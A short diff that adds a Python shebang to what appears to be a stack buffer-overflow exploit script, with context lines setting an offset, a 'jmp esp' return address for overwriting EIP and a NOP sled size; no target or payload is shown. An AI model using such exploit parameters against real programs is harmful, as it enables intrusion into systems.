@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 offset = 98
 eip = b'\x5e\x51\x9a\x5e' #: jmp esp
 nops = 200
